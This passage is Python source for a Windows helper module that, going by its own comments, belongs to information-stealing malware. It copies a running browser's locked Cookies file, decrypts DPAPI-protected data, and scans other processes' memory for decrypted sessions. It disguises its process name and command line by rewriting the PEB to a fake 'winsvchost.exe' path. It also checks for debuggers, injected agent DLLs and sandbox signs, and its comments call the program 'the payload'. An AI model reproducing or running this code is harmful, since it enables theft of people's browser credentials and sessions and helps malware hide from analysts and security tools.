        log.logger.debug("GlobalMemoryStatusEx -> %d", ctypes.get_last_error())
        return None
    return MemoryStatus(
        total_phys=int(status.ullTotalPhys),
        avail_phys=int(status.ullAvailPhys),
        load_percent=int(status.dwMemoryLoad),
    )


def monitors() -> list[MonitorInfo]:
    if not _WINDOWS:
        return []
    found: list[MonitorInfo] = []

    def callback(
        hmonitor: int,
        hdc: int,
        rect: ctypes.POINTER(RECT),
        data: int,
    ) -> bool:
        info = MONITORINFOEXW()
        info.cbSize = ctypes.sizeof(MONITORINFOEXW)
        if not _user32.GetMonitorInfoW(hmonitor, ctypes.byref(info)):
            return True
        found.append(
            MonitorInfo(
                left=int(info.rcMonitor.left),
                top=int(info.rcMonitor.top),
                right=int(info.rcMonitor.right),
                bottom=int(info.rcMonitor.bottom),
                device=str(info.szDevice),
                primary=bool(info.dwFlags & _MONITORINFOF_PRIMARY),
            )
        )
        return True

    procedure = MONITORENUMPROC(callback)
    _user32.EnumDisplayMonitors(None, None, procedure, 0)
    return found


def uptime_ms() -> int | None:
    if not _WINDOWS:
        return None
    return int(_k32.GetTickCount64())


def native_system_info() -> SystemInfo | None:
    if not _WINDOWS:
        return None
    info = SYSTEM_INFO()
    _k32.GetNativeSystemInfo(ctypes.byref(info))
    return SystemInfo(
        processors=int(info.dwNumberOfProcessors),
        page_size=int(info.dwPageSize),
        architecture=int(info.wProcessorArchitecture),
    )


def disk_total_bytes(path: str) -> int | None:
    if not _WINDOWS:
        return None
    free = ctypes.c_ulonglong(0)
    total = ctypes.c_ulonglong(0)
    available = ctypes.c_ulonglong(0)
    if not _k32.GetDiskFreeSpaceExW(
        path, ctypes.byref(free), ctypes.byref(total), ctypes.byref(available)
    ):
        log.logger.debug("GetDiskFreeSpaceExW %s -> %d", path, ctypes.get_last_error())
        return None
    return int(total.value)


def user_name() -> str | None:
    if not _WINDOWS:
        return None
    capacity = 257
    buffer = ctypes.create_unicode_buffer(capacity)
    size = wintypes.DWORD(capacity)
    if not _advapi32.GetUserNameW(buffer, ctypes.byref(size)):
        log.logger.debug("GetUserNameW -> %d", ctypes.get_last_error())
        return None
    return buffer.value


# --- files --------------------------------------------------------------------


def copy_shared(source: Path, destination: Path) -> bool:
    """Copy a file another process has open, by granting every share mode.

    ``shutil.copy2`` opens the source with Python's default share mode and a running
    Edge refuses its live ``Cookies`` with ``WinError 32``. Sharing is a property of
    what the opener grants, so this asks for read while granting read, write and
    delete — the same access a backup tool takes. False on any failure, with the
    reason logged: a locked file costs that file, never the run.
    """
    if not _WINDOWS:
        return False

    handle = _k32.CreateFileW(
        str(source),
        _GENERIC_READ,
        _FILE_SHARE_ALL,
        None,
        _OPEN_EXISTING,
        _FILE_ATTRIBUTE_NORMAL,
        None,
    )
    if handle is None or handle == _INVALID_HANDLE:
        log.logger.debug("copy_shared: open %s -> %d", source, ctypes.get_last_error())
        return False

    destination.parent.mkdir(parents=True, exist_ok=True)
    buffer = ctypes.create_string_buffer(_SHARED_COPY_CHUNK)
    read = wintypes.DWORD(0)

    try:
        with destination.open("wb") as sink:
            while True:
                if not _k32.ReadFile(
                    handle, buffer, _SHARED_COPY_CHUNK, ctypes.byref(read), None
                ):
                    log.logger.debug(
                        "copy_shared: read %s -> %d", source, ctypes.get_last_error()
                    )
                    return False
                if read.value == 0:
                    return True
                sink.write(buffer.raw[: read.value])
    except OSError:
        log.logger.debug("copy_shared: write %s failed", destination, exc_info=True)
        return False
    finally:
        _k32.CloseHandle(handle)


# --- mutex --------------------------------------------------------------------


def create_mutex(name: str) -> tuple[int | None, bool]:
    """(handle, created). ``created`` is False when another instance holds it.

    A NULL handle is not fatal: the guard is missing, the run continues, and the
    fact is logged. Exiting here would kill the payload for a benign reason.
    """
    if not _WINDOWS:
        return None, True
    handle = _k32.CreateMutexW(None, False, name)
    error = ctypes.get_last_error()
    if not handle:
        log.logger.warning("CreateMutexW failed (%d); continuing without the guard", error)
        return None, True
    return int(handle), error != ERROR_ALREADY_EXISTS


# --- processes ----------------------------------------------------------------


def process_names() -> frozenset[str]:
    """Lowercased image names of running processes, capped and always closed."""
    if not _WINDOWS:
        return frozenset()
    snapshot = _k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot is None or snapshot == _INVALID_HANDLE:
        log.logger.debug("CreateToolhelp32Snapshot -> %d", ctypes.get_last_error())
        return frozenset()
    names: set[str] = set()
    try:
        entry = PROCESSENTRY32W()
        entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)
        if not _k32.Process32FirstW(snapshot, ctypes.byref(entry)):
            return frozenset()
        count = 0
        while count < _MAX_PROCESSES:
            names.add(entry.szExeFile.lower())
            count += 1
            entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)
            if not _k32.Process32NextW(snapshot, ctypes.byref(entry)):
                break
    finally:
        _k32.CloseHandle(snapshot)
    return frozenset(names)


def process_list() -> list[tuple[int, str]]:
    """``(pid, image name)`` for every process, in enumeration order.

    ``process_names`` answers "is this running"; this answers "which one", which is what
    a reader needs before it can open a handle. Both walk the same snapshot API and both
    close it in a ``finally``, because a snapshot is a kernel handle with a real cost.
    """
    if not _WINDOWS:
        return []
    snapshot = _k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot is None or snapshot == _INVALID_HANDLE:
        log.logger.debug("CreateToolhelp32Snapshot -> %d", ctypes.get_last_error())
        return []
    found: list[tuple[int, str]] = []
    try:
        entry = PROCESSENTRY32W()
        entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)
        if not _k32.Process32FirstW(snapshot, ctypes.byref(entry)):
            return []
        count = 0
        while count < _MAX_PROCESSES:
            found.append((int(entry.th32ProcessID), str(entry.szExeFile)))
            count += 1
            entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)
            if not _k32.Process32NextW(snapshot, ctypes.byref(entry)):
                break
    finally:
        _k32.CloseHandle(snapshot)
    return found


def process_private_bytes(pid: int) -> int | None:
    """Private committed bytes for one process, or ``None`` when it cannot be read.

    This is the ordering key for a memory scan: a browser is forty processes and the one
    holding a decrypted session is small. ``None`` rather than a sentinel number, so the
    caller decides where unreadable processes sort instead of inheriting a magic value.
    """
    if not _WINDOWS:
        return None
    handle = _k32.OpenProcess(_PROCESS_QUERY_LIMITED, False, pid)
    if not handle:
        return None
    try:
        counters = PROCESS_MEMORY_COUNTERS_EX()
        counters.cb = ctypes.sizeof(PROCESS_MEMORY_COUNTERS_EX)
        if not _k32.K32GetProcessMemoryInfo(handle, ctypes.byref(counters), counters.cb):
            return None
        return int(counters.PrivateUsage)
    finally:
        _k32.CloseHandle(handle)


class RemoteProcess:
    """A read handle on another process, closed on exit from the ``with`` block.

    ``regions`` yields committed, readable, non-guard ``(base, size)`` pairs in address
    order. ``read_into`` fills a caller-owned buffer so a scan of a few hundred megabytes
    allocates one buffer instead of one per chunk. Neither raises: an unreadable page
    ends that region and the next ``VirtualQueryEx`` picks up after it, because a browser
    with a guard page in the middle of its heap is normal and not an error.
    """

    def __init__(self, pid: int) -> None:
        self.pid = pid
        self.handle: int | None = None

    def __enter__(self) -> RemoteProcess:
        if not _WINDOWS:
            return self
        handle = _k32.OpenProcess(
            _PROCESS_VM_READ | _PROCESS_QUERY_INFORMATION, False, self.pid
        )
        if not handle:
            # A process running at a higher integrity level refuses the full mask. The
            # limited one still opens for query, which is enough to walk past it.
            handle = _k32.OpenProcess(
                _PROCESS_VM_READ | _PROCESS_QUERY_LIMITED, False, self.pid
            )
        self.handle = int(handle) if handle else None
        return self

    def __exit__(self, *_: object) -> None:
        if self.handle:
            _k32.CloseHandle(self.handle)
            self.handle = None

    def __bool__(self) -> bool:
        return self.handle is not None

    def regions(self) -> Iterator[tuple[int, int]]:
        if self.handle is None:
            return
        address = 0
        while address < _USER_ADDRESS_LIMIT:
            info = MEMORY_BASIC_INFORMATION64()
            written = _k32.VirtualQueryEx(
                self.handle,
                address,
                ctypes.byref(info),
                ctypes.sizeof(info),
            )
            if not written:
                return
            base = int(info.BaseAddress)
            size = int(info.RegionSize)
            if size <= 0:
                return
            protect = int(info.Protect) & 0xFF
            if (
                int(info.State) == _MEM_COMMIT
                and not int(info.Protect) & _PAGE_GUARD
                and protect != _PAGE_NOACCESS
                and protect in _READABLE
            ):
                yield base, size
            address = base + size

    def read_into(self, address: int, buffer: object, size: int) -> int:
        """Bytes read into ``buffer``, or 0 when the page cannot be read."""
        if self.handle is None or size <= 0:
            return 0
        got = ctypes.c_size_t(0)
        if not _k32.ReadProcessMemory(
            self.handle, address, buffer, size, ctypes.byref(got)
        ):
            return 0
        return int(got.value)


# --- modules and addresses ----------------------------------------------------


def module_handle(name: str | None = None) -> int | None:
    if not _WINDOWS:
        return None
    handle = _k32.GetModuleHandleW(name)
    if not handle:
        log.logger.debug("GetModuleHandleW %s -> %d", name, ctypes.get_last_error())
        return None
    return int(handle)


def load_library(name: str) -> int | None:
    if not _WINDOWS:
        return None
    handle = _k32.LoadLibraryW(name)
    if not handle:
        log.logger.debug("LoadLibraryW %s -> %d", name, ctypes.get_last_error())
        return None
    return int(handle)


def proc_address(module: int, name: str) -> int | None:
    """Resolved address, or None. The c_void_p restype is what keeps this honest."""
    if not _WINDOWS:
        return None
    address = _k32.GetProcAddress(wintypes.HMODULE(module), name.encode("ascii"))
    if not address:
        log.logger.debug("GetProcAddress %s -> %d", name, ctypes.get_last_error())
        return None
    return int(address)


# --- memory protection --------------------------------------------------------


def virtual_protect(address: int, size: int, new_protect: int) -> int | None:
    """Previous protection, or None. Callers must restore it."""
    if not _WINDOWS:
        return None
    previous = wintypes.DWORD(0)
    if not _k32.VirtualProtect(
        ctypes.c_void_p(address), ctypes.c_size_t(size), new_protect, ctypes.byref(previous)
    ):
        log.logger.debug(
            "VirtualProtect %#x+%d -> %d", address, size, ctypes.get_last_error()
        )
        return None
    return int(previous.value)


# --- DPAPI --------------------------------------------------------------------


def crypt_unprotect(blob: bytes) -> bytes | None:
    """In-process DPAPI unwrap under the current user, or None."""
    if not _WINDOWS:
        return None
    if not blob:
        return None
    # The input buffer is kept referenced for the whole call; letting a temporary
    # die here hands CryptUnprotectData a dangling pointer.
    buffer = ctypes.create_string_buffer(blob, len(blob))
    data_in = DATA_BLOB(len(blob), ctypes.cast(buffer, ctypes.POINTER(ctypes.c_char)))
    data_out = DATA_BLOB()
    ok = _crypt32.CryptUnprotectData(
        ctypes.byref(data_in), None, None, None, None, 0, ctypes.byref(data_out)
    )
    if not ok:
        log.logger.debug("CryptUnprotectData -> %d", ctypes.get_last_error())
        return None
    try:
        return ctypes.string_at(data_out.pbData, data_out.cbData)
    finally:
        _k32.LocalFree(ctypes.cast(data_out.pbData, wintypes.HLOCAL))


# --- this process -------------------------------------------------------------
# Three operations that change how the process looks rather than what it does: how hard
# the scheduler pushes it, how much of it stays resident, and the name the process list
# reads. All three are best-effort and return a value instead of raising, because every
# one of them is cosmetic to the run and a failure is a line in the log, not an abort.
#
# The PEB rewrite is the only one that can corrupt memory if it is wrong, so it is built
# the other way round from the usual recipe: rather than write at fixed offsets, it
# scans for a UNICODE_STRING-shaped triple whose text matches this process's own image
# path, and writes only when it found one. A block that grew a member between Windows
# releases produces "no match" and no write, never a pointer overwritten with a string.

_THREAD_PRIORITY_BELOW_NORMAL: Final[int] = -2
_BELOW_NORMAL_PRIORITY_CLASS: Final[int] = 0x00004000
_MDT_EFFECTIVE_DPI: Final[int] = 0

# The scan window covers the standard input handles through the environment pointer.
# It starts past ``MaximumLength``/``Length``/``Flags``/``DebugFlags`` and ends before
# the console mode buffers, so it cannot accidentally read a console handle as a
# string length.
_PARAMS_SCAN_START: Final[int] = 0x38
_PARAMS_SCAN_END: Final[int] = 0x128


def lower_thread_priority() -> bool:
    """Drop the calling thread to below normal. True when the kernel agreed."""
    if not _WINDOWS:
        return False
    if not _k32.SetThreadPriority(_k32.GetCurrentThread(), _THREAD_PRIORITY_BELOW_NORMAL):
        log.logger.debug("SetThreadPriority -> %d", ctypes.get_last_error())
        return False
    return True


def lower_priority() -> bool:
    """Drop the whole process to below normal, so a collection never competes."""
    if not _WINDOWS:
        return False
    if not _k32.SetPriorityClass(_k32.GetCurrentProcess(), _BELOW_NORMAL_PRIORITY_CLASS):
        log.logger.debug("SetPriorityClass -> %d", ctypes.get_last_error())
        return False
    return True


def trim_working_set() -> bool:
    """Empty the working set. The pages fault back in if anything still needs them."""
    if not _WINDOWS:
        return False
    # (SIZE_T)-1 for both bounds is the documented "trim as much as possible".
    if not _k32.SetProcessWorkingSetSize(
        _k32.GetCurrentProcess(), ctypes.c_size_t(-1), ctypes.c_size_t(-1)
    ):
        log.logger.debug("SetProcessWorkingSetSize -> %d", ctypes.get_last_error())
        return False
    return True


def module_file_name() -> str | None:
    """The full path of the running image, as the loader knows it."""
    if not _WINDOWS:
        return None
    buffer = ctypes.create_unicode_buffer(1024)
    written = int(_k32.GetModuleFileNameW(None, buffer, 1024))
    if written <= 0:
        log.logger.debug("GetModuleFileNameW -> %d", ctypes.get_last_error())
        return None
    return buffer.value


def monitor_dpi() -> dict[str, tuple[int, int]]:
    """Device name -> (horizontal, vertical) DPI. Empty when shcore refuses.

    ``GetDpiForMonitor`` with ``MDT_EFFECTIVE_DPI`` is the number Explorer uses for
    scaling, so it is the number that explains a 1920-wide screenshot on a 4K panel.
    """
    found: dict[str, tuple[int, int]] = {}
    if not _WINDOWS or _shcore is None:
        return found

    def callback(
        hmonitor: int,
        hdc: int,
        rect: ctypes.POINTER(RECT),
        data: int,
    ) -> bool:
        info = MONITORINFOEXW()
        info.cbSize = ctypes.sizeof(MONITORINFOEXW)
        if not _user32.GetMonitorInfoW(hmonitor, ctypes.byref(info)):
            return True
        horizontal = wintypes.UINT(0)
        vertical = wintypes.UINT(0)
        status = int(
            _shcore.GetDpiForMonitor(
                hmonitor, _MDT_EFFECTIVE_DPI, ctypes.byref(horizontal), ctypes.byref(vertical)
            )
        )
        if status == 0:
            found[str(info.szDevice)] = (int(horizontal.value), int(vertical.value))
        return True

    procedure = MONITORENUMPROC(callback)
    _user32.EnumDisplayMonitors(None, None, procedure, 0)
    return found


class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", ctypes.c_void_p),
    ]


class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("ExitStatus", ctypes.c_long),
        ("PebBaseAddress", ctypes.c_void_p),
        ("AffinityMask", ctypes.c_size_t),
        ("BasePriority", ctypes.c_long),
        ("UniqueProcessId", ctypes.c_size_t),
        ("InheritedFromUniqueProcessId", ctypes.c_size_t),
    ]


def _peb() -> int | None:
    if not _WINDOWS:
        return None
    information = PROCESS_BASIC_INFORMATION()
    returned = wintypes.ULONG(0)
    status = int(
        _ntdll.NtQueryInformationProcess(
            _k32.GetCurrentProcess(),
            0,  # ProcessBasicInformation
            ctypes.byref(information),
            ctypes.sizeof(information),
            ctypes.byref(returned),
        )
    )
    if status != 0 or not information.PebBaseAddress:
        return None
    return int(information.PebBaseAddress)


def _process_parameters(peb: int) -> int | None:
    """``RTL_USER_PROCESS_PARAMETERS`` out of the PEB, validated before it is trusted."""
    pointer_size = ctypes.sizeof(ctypes.c_void_p)
    offset = 0x20 if pointer_size == 8 else 0x10
    try:
        raw = ctypes.string_at(peb + offset, pointer_size)
    except (ValueError, OSError):
        return None
    address = int.from_bytes(raw, "little")
    if address < 0x10000:
        return None
    try:
        maximum, length = (
            int.from_bytes(ctypes.string_at(address + 0, 2), "little"),
            int.from_bytes(ctypes.string_at(address + 4, 2), "little"),
        )
    except (ValueError, OSError):
        return None
    if length == 0 or maximum < length or maximum > 0x10000:
        return None
    return address


def _unicode_at(address: int) -> tuple[str, int, int] | None:
    """Read a UNICODE_STRING. Returns ``(text, length, maximum)`` when it is credible."""
    try:
        value = UNICODE_STRING.from_buffer_copy(
            ctypes.string_at(address, ctypes.sizeof(UNICODE_STRING))
        )
    except (ValueError, OSError):
        return None
    length = int(value.Length)
    maximum = int(value.MaximumLength)
    if length < 2 or length % 2 or length > 0x1000:
        return None
    if maximum < length or maximum > 0x1000:
        return None
    buffer = int(value.Buffer or 0)
    if buffer < 0x10000:
        return None
    try:
        text = ctypes.wstring_at(buffer, length // 2)
    except (ValueError, OSError):
        return None
    if not text or "\x00" in text:
        return None
    return text, length, maximum


def _find_string(
    parameters: int, needle: str, *, prefix: bool
) -> tuple[int, int, str, int] | None:
    """First plausible triple in the parameters block whose text is ``needle``.

    ``prefix`` is for CommandLine, which starts with the image path and then carries
    arguments. Identity is the image path itself, so a field that happens to hold a
    long wide string but not this executable cannot be matched by accident.
    """
    target = needle.casefold()
    for offset in range(_PARAMS_SCAN_START, _PARAMS_SCAN_END, ctypes.sizeof(ctypes.c_void_p)):
        found = _unicode_at(parameters + offset)
        if found is None:
            continue
        text, length, maximum = found
        folded = text.casefold()
        if prefix:
            # Strictly longer, and past a leading quote: the command line is either
            # ``"path" args`` or ``path args``, and an exact match is the image field
            # itself, which must not be rewritten twice.
            trimmed = folded[1:] if folded.startswith('"') else folded
            matched = trimmed.startswith(target) and len(trimmed) > len(needle)
        else:
            matched = folded == target
        if matched:
            return parameters + offset, length, text, maximum
    return None


def _write_protected(address: int, size: int, write: object) -> bool:
    """Run ``write()`` with ``address`` made writable, then restore protection."""
    previous = wintypes.DWORD(0)
    if not _k32.VirtualProtect(
        ctypes.c_void_p(address), size, PAGE_READWRITE, ctypes.byref(previous)
    ):
        log.logger.debug("mask: VirtualProtect -> %d", ctypes.get_last_error())
        return False
    try:
        write()  # type: ignore[operator]
    finally:
        restored = wintypes.DWORD(0)
        _k32.VirtualProtect(ctypes.c_void_p(address), size, previous.value, ctypes.byref(restored))
    return True


# Buffers handed to the PEB outlive every frame that touches them. A rewrite that has to
# grow the string allocates here and never frees: sixty bytes in a process that exits in
# minutes is cheaper than a realloc the loader does not expect.
_PINNED: list[ctypes.Array[ctypes.c_wchar]] = []


def _rewrite(field: int, text: str, old_length: int) -> bool:
    """Point one UNICODE_STRING at ``text``. False when nothing could be written.

    Two shapes. When the new text fits the existing allocation it is written in place and
    the tail is zeroed, which leaves every other pointer in the block untouched. When it
    does not fit, the string is allocated in this process and the sixteen-byte structure
    is repointed: the only write to the parameters block is the one that describes the
    string, never a relocation of a loader-owned buffer.
    """
    try:
        value = UNICODE_STRING.from_buffer_copy(
            ctypes.string_at(field, ctypes.sizeof(UNICODE_STRING))
        )
    except (ValueError, OSError):
        return False
    encoded = text.encode("utf-16-le", "replace")
    if not encoded:
        return False

    maximum = int(value.MaximumLength)
    buffer = int(value.Buffer or 0)

    if buffer >= 0x10000 and len(encoded) <= maximum:

        def in_place() -> None:
            ctypes.memmove(buffer, encoded, len(encoded))
            # The tail is zeroed so anything that reads to MaximumLength sees the end of
            # the string rather than the remains of the path that used to be there.
            remainder = min(old_length, maximum) - len(encoded)
            if remainder > 0:
                ctypes.memset(buffer + len(encoded), 0, remainder)

        def set_length() -> None:
            ctypes.cast(ctypes.c_void_p(field), ctypes.POINTER(wintypes.USHORT))[0] = len(encoded)

        if not _write_protected(buffer, max(maximum, len(encoded)), in_place):
            return False
        return _write_protected(field, ctypes.sizeof(UNICODE_STRING), set_length)

    pinned = ctypes.create_unicode_buffer(text)
    _PINNED.append(pinned)
    described = UNICODE_STRING(len(encoded), len(encoded), ctypes.addressof(pinned))

    def repoint() -> None:
        ctypes.memmove(field, ctypes.byref(described), ctypes.sizeof(UNICODE_STRING))

    return _write_protected(field, ctypes.sizeof(UNICODE_STRING), repoint)


def mask_process_image(name: str) -> dict[str, object]:
    """Present ``name`` as this process's image and command line. Best effort, recorded.

    The path keeps its directory: ``%LOCALAPPDATA%\\Programs\\WinSvcHost\\winsvchost.exe``
    becomes ``...\\<name>``, which is what the staged copy on disk is called. The PEB is
    a display string, so a name that does not exist on disk is not a contradiction, but a
    name in a directory that does not exist reads as a forgery to anything looking.
    """
    result: dict[str, object] = {"image": False, "command": False, "reason": ""}
    if not _WINDOWS:
        result["reason"] = "not windows"
        return result
    if not name.strip():
        result["reason"] = "no name"
        return result

    actual = module_file_name()
    peb = _peb()
    if actual is None or peb is None:
        result["reason"] = "no peb"
        return result
    parameters = _process_parameters(peb)
    if parameters is None:
        result["reason"] = "no parameters"
        return result

    wanted = str(Path(actual).with_name(name))

    found = _find_string(parameters, actual, prefix=False)
    if found is not None and _rewrite(found[0], wanted, found[1]):
        result["image"] = True

    line = _find_string(parameters, actual, prefix=True)
    if line is not None:
        field, length, text, _maximum = line
        quoted = text.startswith('"')
        body = text[1:] if quoted else text
        tail = body[len(actual) :]
        # The quote that closed the old path is ours now: it is re-emitted in front of
        # the tail, so leaving it attached would produce ``"path"" -args``.
        if quoted and tail.startswith('"'):
            tail = tail[1:]
        rewritten = f'"{wanted}"{tail}' if quoted else f"{wanted}{tail}"
        if _rewrite(field, rewritten, length):
            result["command"] = True

    if not result["image"] and not result["command"]:
        result["reason"] = "no match"
        log.logger.debug("mask: PEB scan found no image path")
    return result


_DPI_AWARENESS_DONE: Final[list[bool]] = []


def enable_dpi_awareness() -> bool:
    """Per-monitor-v2 awareness. Idempotent; True when the process is aware.

    Without this a 150% display presents a 1706-wide desktop to a process that thinks it
    is 2560: the screenshot comes back upscaled, and every monitor rectangle in
    ``monitors()`` disagrees with the pixels under it. It must run before the first
    enumeration, so entry calls it before anything else touches the display.
    """
    if not _WINDOWS:
        return False
    if _DPI_AWARENESS_DONE:
        return True

    aware = False
    # -4 is DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2. The context values are negative
    # small integers dressed as handles, so they are wrapped as pointer-sized unsigned.
    mask = (1 << (8 * ctypes.sizeof(ctypes.c_void_p))) - 1
    try:
        function = _user32.SetProcessDpiAwarenessContext
        function.argtypes = [ctypes.c_void_p]
        function.restype = wintypes.BOOL
        aware = bool(function(ctypes.c_void_p(-4 & mask)))
    except AttributeError:  # pragma: no cover - pre-1703 Windows
        aware = False
    if not aware:
        try:
            aware = bool(_user32.SetProcessDPIAware())
        except AttributeError:  # pragma: no cover
            aware = False

    _DPI_AWARENESS_DONE.append(aware)
    log.logger.debug("dpi awareness: %s", aware)
    return aware


def debugger_present() -> dict[str, bool]:
    """``{"local": .., "remote": ..}``. Either one true is a debugger."""
    if not _WINDOWS:
        return {"local": False, "remote": False}
    local = bool(_k32.IsDebuggerPresent())
    remote = wintypes.BOOL(False)
    attached = bool(
        _k32.CheckRemoteDebuggerPresent(_k32.GetCurrentProcess(), ctypes.byref(remote))
    )
    return {"local": local, "remote": bool(attached and remote.value)}


def module_present(name: str) -> bool:
    """True when ``name`` is loaded in this process. Used for injected agent DLLs."""
    if not _WINDOWS or not name:
        return False
    return bool(_k32.GetModuleHandleW(name))


def window_count() -> int:
    """Visible top-level windows that carry a title.

    A bare desktop is the cheapest sandbox tell there is: an analysis host boots to a
    login and runs the sample with nothing on screen, where a real desktop has a shell,
    a browser or a chat window with a caption on it.
    """
    if not _WINDOWS:
        return 0
    total = [0]

    def callback(hwnd: int, data: int) -> bool:
        if not _user32.IsWindowVisible(hwnd):
            return True
        if int(_user32.GetWindowTextLengthW(hwnd)) > 0:
            total[0] += 1
        return True

    procedure = ENUMWINDOWSPROC(callback)
    _user32.EnumWindows(procedure, 0)
    return total[0]


__all__ = [
    "HKEY_CURRENT_USER",
    "HKEY_LOCAL_MACHINE",
    "KEY_SET_VALUE",
    "PAGE_EXECUTE_READWRITE",
    "PAGE_READWRITE",
    "AdapterInfo",
    "MemoryStatus",
    "MonitorInfo",
    "RemoteProcess",
    "SystemInfo",
    "acpi_vendor_strings",
    "adapters",
    "copy_shared",
    "create_mutex",
    "crypt_unprotect",
    "debugger_present",
    "disk_total_bytes",
    "enable_dpi_awareness",
    "enum_firmware_tables",
    "firmware_table",
    "first_physical_mac",
    "load_library",
    "lower_priority",
    "lower_thread_priority",
    "mask_process_image",
    "memory_status",
    "module_file_name",
    "module_handle",
    "module_present",
    "monitor_dpi",
    "monitors",
    "native_system_info",
    "proc_address",
    "process_list",
    "process_names",
    "process_private_bytes",
    "registry_delete_value",
    "registry_key_exists",
    "registry_set_string",
    "registry_value",
    "smbios_type1",
    "trim_working_set",
    "uptime_ms",
    "user_name",
    "virtual_protect",
    "window_count",
]
